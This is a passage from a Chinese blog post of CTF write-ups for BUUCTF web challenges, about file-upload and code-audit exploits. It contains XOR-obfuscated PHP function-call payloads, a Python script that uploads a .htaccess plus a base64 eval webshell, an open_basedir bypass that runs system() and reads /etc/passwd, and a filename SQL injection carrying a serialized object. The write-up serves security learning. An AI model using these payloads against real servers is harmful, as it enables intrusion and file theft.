                    <span class="token variable">$flag2</span><span class="token punctuation">[</span><span class="token variable">$len</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string">"\${"</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"^"</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"}"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">xorCode</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我写的很长时间的原因也很简单，这里就当一个坑谈谈</p>
<p>异或时需要尽可能的避免出现可见字符，在执行的过程中，一些字符会对异或造成影响【比如}和:】</p>
<p>说的简单点，字符要从ascii码表127之后匹配</p>
<p>我就是从0开始，一直执行失败，写代码半小时，修改大半天后发现还是原来的版本…….</p>
<ul>
<li>因为有字符数的限制，所以不能完全的写异或字符，所以payload如下</li>
</ul>
<pre class="line-numbers language-payload"><code class="language-payload">?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=phpinfo
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20211104220812522.png" alt="image-20211104220812522"></p>
<h3 id="上传-htaccess文件-getshell"><a href="#上传-htaccess文件-getshell" class="headerlink" title="上传.htaccess文件 getshell"></a>上传.htaccess文件 getshell</h3><p>题目开始给了我们一个get_the_flag 函数，但并没有执行，这步正好可以利用上面的异或来执行这个函数</p>
<p><img src="image-20211104221159566.png" alt="image-20211104221159566"></p>
<pre class="line-numbers language-payload"><code class="language-payload">?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里上传文件需要满足三个条件</p>
<ul>
<li><p>后缀名不能有ph</p>
<p>  有两个思路，一是截断后缀名，解析绕过等，二是上传.htaccess添加解析条件</p>
</li>
<li><p>文件内容不能出现&lt;?</p>
<p>  php5版本使用<code>&lt;script language=&quot;php&quot;&gt;eval();&lt;/script&gt;</code>来绕过限制，但这个方法在php7中不可用【异或命令执行可得知php版本为7.2.19】</p>
</li>
<li><p>文件前6个字节需为图片标识</p>
<p>  这个条件最简单，只需要在文件开头加上GIF89A12即可</p>
</li>
</ul>
<p>第一个条件二选一可以暂留，主要是第二个</p>
<p>这里我看了wp</p>
<p>++++</p>
<p><strong>用python文件上传：</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64

<span class="token comment" spellcheck="true"># b"xxx"以字节的形式储存数据</span>
<span class="token triple-quoted-string string">"""python中多行注释单独写出为注释，写入变量为多行写入
    题目要求文件开头为图片，但.htaccess无法生效
    所以使用#define width 1337#define height 1337 绕过
    #表示注释
    接下来就是两行规则，讲.pp解析为php,base64解码shell.ppp
"""</span>
htaccess <span class="token operator">=</span> b<span class="token triple-quoted-string string">"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ppp
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ppp"
"""</span>
shell <span class="token operator">=</span> b<span class="token string">"GIF89A12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"&lt;?php eval($_REQUEST['cmd']);?>"</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string">"http://c5fc0561-1461-4eef-a3ce-fd83d3b7f5be.node3.buuoj.cn/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=get_the_flag"</span>

<span class="token comment" spellcheck="true">#上传两个文件</span>
files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span><span class="token string">"Submit"</span><span class="token punctuation">}</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'shell.ppp'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>+++</p>
<p>上面就是wp的python脚本，这里其实也大可不必脚本，只要手速够快，在REMOTE_ADDR变换前写入两个文件即可</p>
<p>其中在htaccess文件里加注释绕过我一直不懂，有人说是#截断让行无效化</p>
<p>但经过测试，应该是用#define width 1337和#define height 1337伪造了图片的宽和高，使服务器认为这是一个图片</p>
<p> <img src="image-20211105131407883.png" alt="image-20211105131407883"></p>
<h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><p>参考文章<code>https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/</code></p>
<p>之前分析过原理，不过时间有点久，我也忘了，这次直接贴payload</p>
<pre class="line-numbers language-payload"><code class="language-payload">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('ls');
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-php"><code class="language-php">原理：
<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个目录Von</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//切换到Von目录下</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//把open_basedir切换到上层目录</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//以下是把目录切换到根目录</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置open_basedir为根目录(此时相当于没有设置open_basedir)</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//读取/etc/passwd</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p><img src="image-20211105132512541.png" alt="image-20211105132512541"></p>
<pre class="line-numbers language-flag"><code class="language-flag">flag{88f35866-46d9-47ed-9b58-fc7d23bf23a8}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>提一句题外话，算是又感而发</p>
<p>任何漏洞的产生，不是我们理所当然的认为该这样所以是这样</p>
<p>就好像这道题#define 伪造宽高，chdir(‘..’);过open_basedir，不是可以伪造宽高和执行cd导致漏洞 </p>
<p>而是底层代码的逻辑出现了问题，让我们可以伪造宽高和执行cd</p>
<p>代码审计，是安全的根本</p>
</blockquote>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>解法同EasyWeb文件上传部分，我不想重复写</p>
<p>难题虽难，但果然很有意思，学到不少东西</p>
<h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{7b0d8cdf-ef59-4a48-990a-ef2155c66d77}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>有意思的一道题目</p>
<p>虽然我之前就听说过文件名sql注入这个东西，但从另一种角度看，这道题算是我自己审计出漏洞的第一题</p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>第一个考点很偏门，但我好像也不是很意外，学安全哪有不会信息收集的，从这个角度看，这考点还蛮不错的</p>
<p><img src="image-20211106102652460.png" alt="image-20211106102652460"></p>
<p>去github搜即可得到源码</p>
<h3 id="审计-反序列化"><a href="#审计-反序列化" class="headerlink" title="审计-反序列化"></a>审计-反序列化</h3><p>首先源码里可以找到一个很明显的反序列化任意文件读取</p>
<p><img src="image-20211106102913745.png" alt="image-20211106102913745"></p>
<p>接着看看有没有利用点</p>
<p><img src="image-20211106103050186.png" alt="image-20211106103050186"></p>
<p><img src="image-20211106103108514.png" alt="image-20211106103108514"></p>
<p>发现在上传图片时程序会将图片的宽高序列化，然后在显示图片时序列化</p>
<p>所以下一个目标就是让序列化的宽高成为构造好的序列化exp</p>
<h3 id="审计-文件名sql注入"><a href="#审计-文件名sql注入" class="headerlink" title="审计-文件名sql注入"></a>审计-文件名sql注入</h3><p>伪造宽高显然不现实，好在这里还有个sql注入</p>
<p><img src="image-20211106103607479.png" alt="image-20211106103607479"></p>
<p>这个点是调试出来的，同时可知$sql_val一共有四个值，第四个即为序列化的宽高</p>
<p>同样，也可以得到文件名不变的结论，即程序对文件名没有任意的处理</p>
<p>这里我已经把调试关了所以不贴截图，如果真有人想探究一下原理，不妨去自己调试一下</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">/*
 * 只能说这题蛮有趣的
 * 思路:
 * 文件上传，需要控制文件上传的宽高的序列化
 * 在显示图片处反序列化，造成任意文件读取
 * 这里宽高实在太难控制，所以需要用sql注入给数据库里注进去
 * 调试之后发现，可以用文件名进行注入操作
 * 其中调试后得知写入的数据格式如下
 * VALUES('1','47e345731fb1eefb.gif','gif','pic/47e345731fb1eefb.gif','a:2:{s:5:"width";i:12849;s:6:"height";i:8224;}')
 * 理清思路，顿感简单，先写个反序列化
 * 写完就下面两句，真勾八简单
 * 然后构造注入语句
 * 9','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a34393a227068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d2f666c6167223b7d)#
')#
 * */</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=/flag";</span>

<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">"9','1','1','1',0x"</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">")#"</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20211106104318925.png" alt="image-20211106104318925"></p>
<p><img src="image-20211106104338067.png" alt="image-20211106104338067"></p>
<h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{d89dae12-80eb-4972-980d-261858d14dd0}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这道题的审计真的很简单，但它的利用思路，真的很好玩</p>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>BUU2 就到这吧</p>
<p>截止2021.11.06，我零零散散刷的这些题，又写了6000字</p>
<p>期间也就偶尔刷一刷，算不得有多快的刷题速度，也好在最近学长整理了一份题目难度表，顺便去除了纯属恶心人的题目，我可算是感觉刷的每到题都能让我学到东西了</p>
<p>说真的，有时我感觉自己的博客不是笔记，而是小说，而且大概连我自己都不会去看，学安全扑街，写作也扑街，生活也是个扑街</p>
<p>感觉我现在整个人就是个三无产品，没钱没技术还没女朋友</p>
<p>吐槽结束，上面纯当乐子看就行，也就我博客没人看，所以这么写写，浏览量高了我不得分分钟把这话删了</p>
<p>接下来刷的题，我会写进BUU3</p>
<p>希望接下来我不看wp也可以自己做出来</p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://atmujie.github.io/2021/06/14/BUUCTF-two/">http://atmujie.github.io/2021/06/14/BUUCTF-two/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Atmujie</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    
        <div class="disqus-card card" data-aos="fade-up">
    <div id="disqus_thread" class="card-content">
        <noscript>Please enable JavaScript to view the
            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
    </div>
</div>

<script type="text/javascript">
    disqus_config = function () {
        this.page.url = 'http://atmujie.github.io/2021/06/14/BUUCTF-two/';
        this.page.identifier = '/2021/06/14/BUUCTF-two/';
        this.page.title = 'BUUCTF ———— two';
    };
    let disqus_shortname = '';

    (function () { // DON'T EDIT BELOW THIS LINE
        let d = document, s = d.createElement('script');
        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/06/21/HCTF2018-admin%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="HCTF2018-admin赛题复现">
                        
                        <span class="card-title">HCTF2018-admin赛题复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-21
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Atmujie
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="SSTI学习记录">
                        
                        <span class="card-title">SSTI学习记录</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Atmujie
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


<!-- 代码块功能依赖 -->
<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->

<!-- 代码语言 -->
<!--  -->
<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
<!--  -->

<!-- 代码块复制 -->
<!-- 
<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 -->

<!-- 代码块收缩 -->
<!--  -->

<!-- 代码块折行 -->
<!-- 
<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>
 -->

    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

